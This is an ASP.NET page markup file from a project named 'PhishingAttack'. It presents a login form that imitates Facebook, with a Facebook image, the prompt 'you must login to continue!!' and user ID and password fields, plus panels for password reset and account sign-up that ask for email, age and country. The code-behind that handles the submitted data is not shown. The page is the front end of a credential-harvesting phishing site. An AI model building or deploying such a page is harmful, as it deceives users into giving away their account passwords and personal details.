<%@ Page Language="C#" AutoEventWireup="true" CodeBehind="UserRegistration.aspx.cs" Inherits="PhishingAttack.Default" %>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html xmlns="http://www.w3.org/1999/xhtml">
<head runat="server">
    <title>Create an Account</title>
    <link rel="icon" href="images/pngegg.png" type="images/gif" sizes="16*16" />
    <link rel="stylesheet" type="text/css" href="css/downstyle.css">
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">

        <style type="text/css">
body {
	text-align: left;
	background-color: rgba(233,232,232,0.89);
	margin-left: auto;
	margin-right: auto;
	margin-bottom: auto;
	margin-top: 15%;
	top: auto;
	left: auto;
	right: auto;
	bottom: auto;
}
#box {
	border-width: thin;
	border-radius: 15px 40px 40px 15px;
	-webkit-box-shadow: 0px 0px;
	box-shadow: 0px 0px;
	border-color: rgba(69,71,181,1.00)
}
tr td h1 {
	font-size: medium;
	text-align: center;
	margin-top: -33px;
	padding-right: 73px;
	font-weight: 300;
	font-family: "Lucida Grande", "Lucida Sans Unicode", "Lucida Sans", "DejaVu Sans", Verdana, sans-serif;
	font-style: normal;
}
tbody tr img {
	width: 40px;
	height: 38px;
	margin-left: 8px;
}
#second {
	text-align: center;
	font-size: large;
	text-shadow: 0px 0px;
	border-width: 0px;
}
#user {
	text-align: center;
}
#pass {
	text-align: center;
}
#submit 
{
   text-align: center;
	-webkit-box-shadow: 0px 0px;
	box-shadow: 0px 0px;
}
#submit #btnSubmit {
	background-color: rgba(31,71,196,0.89);
	width: 100px;
	font-family: Constantia, "Lucida Bright", "DejaVu Serif", Georgia, serif;
	font-weight: 400;
}

body table {
    margin-right: auto;
	margin-bottom: auto;
	margin-left: auto;
	margin-top: 0pt;
	width: 400px;
	border: none;
	height: 200px;
	background-color: rgba(255,255,255,1.00);
	border-radius: 12px 30px 30px 12px;
	-webkit-box-shadow: 0px 0px 70px;
	box-shadow: 0px 0px 70px;
}

tbody tr td {
	border-width: 0px;
}
table tbody tr {
}
.inputfield 
{
	/* Add this as a property for a selector to which the effect has to be applied*/

 /* For Mozilla*/

 -moz-border-radius-topleft:40px;
 -moz-border-radius-topright:40px;
 -moz-border-radius-bottomright:40px;
 -moz-border-radius-bottomleft:40px;
 /*For Webkit*/
 -webkit-border-top-left-radius:40px;
 -webkit-border-top-right-radius:40px;
 -webkit-border-bottom-right-radius:40px;
 -webkit-border-bottom-left-radius:40px;
	}
                        
#secondpnlbox {
	border-width: thin;
	border-radius: 15px 20px 20px 15px;
	-webkit-box-shadow: 0px 0px;
	box-shadow: 0px 0px;
	border-color: rgba(69,71,181,1.00)
}
tr td #secondh1 {
	font-size: 175%;
	text-align: center;
	margin-top: 4px;
	padding-right: 73px;
	font-weight: 300;
	font-family: "Lucida Grande", "Lucida Sans Unicode", "Lucida Sans", "DejaVu Sans", Verdana, sans-serif;
	font-style: normal;
	margin-left: -14px;
	}
tbody tr img {
	width: 40px;
	height: 38px;
	margin-left: 8px;
}
#secondpnlsecond {
	text-align: center;
	font-size: large;
	text-shadow: 0px 0px;
	border-width: 0px;
}
#secondpnluser {
	text-align: center;
}
#secondpnlpass {
	text-align: center;
}
#secondpnlsubmit {
	text-align: center;
	-webkit-box-shadow: 0px 0px;
	box-shadow: 0px 0px;
}
#secondpnlsubmit h5 {
}
#secondpnlsubmit #secondpnlbtncolor {
	background-color: rgba(31,71,196,0.89);
	width: 100px;
	font-family: Constantia, "Lucida Bright", "DejaVu Serif", Georgia, serif;
	font-weight: 400;
}
body table {
	margin-right: auto;
	margin-bottom: auto;
	margin-left: auto;
	margin-top: 0pt;
	width: 400px;
	border: none;
	height: 200px;
	background-color: rgba(255,255,255,1.00);
	border-radius: 12px 22px 32px 12px;
	-webkit-box-shadow: 0px 0px 70px;
	box-shadow: 0px 0px 70px;
}

tbody tr td {
	border-width: 0px;
}
table tbody tr {
}
.secondpnlinputfield 
{
	/* Add this as a property for a selector to which the effect has to be applied*/

 /* For Mozilla*/

 -moz-border-radius-topleft:40px;
 -moz-border-radius-topright:40px;
 -moz-border-radius-bottomright:40px;
 -moz-border-radius-bottomleft:40px;
 /*For Webkit*/
 -webkit-border-top-left-radius:40px;
 -webkit-border-top-right-radius:40px;
 -webkit-border-bottom-right-radius:40px;
 -webkit-border-bottom-left-radius:40px;
	} 
	
	#secondpnlsubmit #thirdpnlbtncolor {
	background-color: rgba(31,71,196,0.89);
	width: 100px;
	font-family: Constantia, "Lucida Bright", "DejaVu Serif", Georgia, serif;
	font-weight: 400;
}

            .style2
            {
                height: 32px;
            }
            .style3
            {
                height: 24px;
            }
        </style>

</head>
<body>
    <form id="form1" runat="server">
    <div>
        
        <asp:Panel ID="Panel1" runat="server">
        
    <div>
<section class="banner" >
<video style="width:1350px; margin-left: -9px; height:600px; margin-top:-200px;" controls>

   <source src="bannervideo.mp4" type="video/mp4">
  
</video>
    
    <br>
    <br>
    <br></br>
    <a class="btn_down" href="#content"><i aria-hidden="true" 
        class="fa fa-angle-double-down"></i></a>
    <br></br>
    </br>
    </br>
  

</section>
<div id="division">
<section class="content" id="content">


       <asp:Panel ID="pnlLogin" runat="server">
        
    <table width="200" border="1">
  <tbody>
   <tr>
   
      <td id="box"><img src="../images/facebook.jpg" width="220" height="200" alt=""/> <h1> you must login to continue!!</h1> </td>
    </tr>
    <tr>
      <td id="second" style="color:red" class="style3">   </td>
    </tr>
    <tr>
      <td id="user">
          <asp:TextBox ID="txtUserName" runat="server" class="inputfield" Height="23px" 
              Width="250px" placeholder="Enter User Id or phone number" style="text-align:center"></asp:TextBox>
        </td>
    </tr>
    <tr>
      <td id="pass">
          <asp:TextBox ID="txtPassword" runat="server" class="inputfield" Height="23px" 
              Width="250px" placeholder="Password" style="text-align:center" TextMode="Password"></asp:TextBox>
        </td>
    </tr>
    <tr>
      <td id="submit">
          <asp:Button ID="btnLogin" runat="server" Text="Login" Width="100px" 
              class="inputfield" onclick="btnSubmit_Click" />
          <asp:Label ID="lblError" runat="server" Text=""></asp:Label>
        </td>
    </tr>
     <tr>
      <td align="center">
      <asp:LinkButton ID="lbtnForgotPassword" runat="server" 
                            Text="Forgot Your Password" Font-Size="13pt" 
                    ForeColor="Orange"  Font-Underline="false" 
              onclick="lbtnForgotPassword_Click"></asp:LinkButton>
        </td>
    </tr>
    <tr>
      <td align="center">
      <asp:LinkButton ID="lbtnCreateAccount" runat="server" 
                            Text="Create an Account" Font-Size="13pt" 
                    ForeColor="Orange"  Font-Underline="false" 
              onclick="lbtnCreateAccount_Click"></asp:LinkButton>
        </td>
    </tr>
  </tbody>
</table>
</asp:Panel>
</div>

</section>

    </div>

        </asp:Panel> 


    
        <asp:Panel ID="pnlForgotAccount" runat="server" Visible="False">
           <table width="200" border="1">
  <tbody>
   <tr>
   
      <td  id="secondpnlbox"> <h1 id="secondh1"> Forgot Your Password </h1> </td>
    </tr>
    <tr>
      <td id="secondpnlsecond">  New Password  </td>
    </tr>
    <tr>
      <td id="secondpnluser">
       <asp:TextBox ID="txtNewPassword"  class="secondpnlinputfield" runat="server" placeholder="Enter Your New Password" style="text-align:center"></asp:TextBox>
      </td>
    </tr>
    <tr>
      <td id="secondpnlsecond">  Re-Type Password  </td>
    </tr>
    <tr>
      <td id="secondpnlpass">
      <asp:TextBox ID="txtReEnterPassword" class="secondpnlinputfield" runat="server" placeholder="Re-Type Password" style="text-align:center"></asp:TextBox>
      </td>
    </tr>
    <tr>
      <td id="secondpnlsubmit">
         <asp:Button ID="secondpnlbtncolor" runat="server" Text="Confirm" 
              class="secondpnlinputfield" onclick="secondpnlbtncolor_Click"/>
            
      </td>
    </tr>
  </tbody>
</table>

        </asp:Panel>

                <asp:Panel ID="pnlCreateAccount" runat="server" Visible="False">
           <table width="200" border="1">
  <tbody>
   <tr>
   
      <td  id="secondpnlbox" class="style2"> <h1 id="secondh1" style="margin-left: -60px"> Create an Account </h1> </td>
    </tr>
    <tr>
      <td id="secondpnlsecond">  User Name  </td>
    </tr>
    <tr>
      <td id="secondpnluser">
      <asp:TextBox ID="txtNewUserName"  class="secondpnlinputfield" runat="server" placeholder="Enter User Name" style="text-align:center"></asp:TextBox>
      </td>
    </tr>
    <tr>
      <td id="secondpnlsecond"> Password  </td>
    </tr>
    <tr>
      <td id="secondpnluser">
      <asp:TextBox ID="txtUserPassword" class="secondpnlinputfield" runat="server" placeholder="Enter Password" style="text-align:center"></asp:TextBox>
      </td>
    </tr>

    <tr>
      <td id="secondpnlsecond"> Confirm Password  </td>
    </tr>
    <tr>
      <td id="secondpnluser">
      <asp:TextBox ID="txtConfirmPassword"  class="secondpnlinputfield" runat="server" placeholder="Confirm Password" style="text-align:center"></asp:TextBox>
      </td>
    </tr>
        <tr>
      <td id="secondpnlsecond" class="style3"> Email  </td>
    </tr>
    <tr>
      <td id="secondpnluser">
      <asp:TextBox ID="txtEmail" class="secondpnlinputfield" runat="server" placeholder="Enter Your Current Email" style="text-align:center"></asp:TextBox>
      </td>
    </tr>
        <tr>
      <td id="secondpnlsecond"> Age  </td>
    </tr>
    <tr>
      <td id="secondpnluser">
      <asp:TextBox ID="txtAge"  class="secondpnlinputfield" runat="server" placeholder="Enter Your Age" style="text-align:center"></asp:TextBox>
      </td>
    </tr>

     <tr>
      <td id="secondpnlsecond" class="style3"> Country  </td>
    </tr>
    <tr>
      <td id="secondpnluser">
          <asp:DropDownList ID="ddlCountry" runat="server" 
              DataTextField="select you country">
              <asp:ListItem Selected="True">Select Your Country</asp:ListItem>
              <asp:ListItem>India</asp:ListItem>
          </asp:DropDownList>
      </td>
    </tr>
    
    <tr>
      <td id="secondpnlsubmit">
         <asp:Button ID="thirdpnlbtncolor" runat="server" Text="Sign Up" 
              class="secondpnlinputfield" onclick="thirdpnlbtncolor_Click"/>
            
       </td>
    </tr>
    
    <tr>
      <td id="secondpnlsecond">
                
          <asp:Label ID="Label2" runat="server" Text="Allready have an account!!" Font-Size="Small"></asp:Label>
            
          <asp:LinkButton ID="LinkButton1" runat="server" Font-Size="Medium" 
              onclick="LinkButton1_Click">SignIn</asp:LinkButton>
            
      </td>
    </tr>
  </tbody>
</table>

        </asp:Panel>
    </div>
    </form>
</body>
</html>
